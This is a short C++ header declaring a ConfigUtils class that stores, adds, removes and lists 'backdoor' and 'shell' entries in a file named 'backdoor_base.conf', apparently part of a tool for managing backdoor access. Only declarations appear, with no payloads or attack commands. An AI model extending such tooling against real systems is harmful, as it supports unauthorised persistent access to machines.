#pragma once

#include <fstream>
#include <string>
#include <iostream>
#include "split.h"

using namespace std;

class ConfigUtils {
private:
	string cfg_name = "backdoor_base.conf";
	int find_max_id(const vector<string>& shells);
	int get_new_id();
public:
	ConfigUtils();
	~ConfigUtils();
	void remove_backdoor(const string& str);
	void add_backdoor(const string& str);
	vector<string> get_backdoors();
	string get_current_backdoor(const string& id);
};

extern ConfigUtils Config;
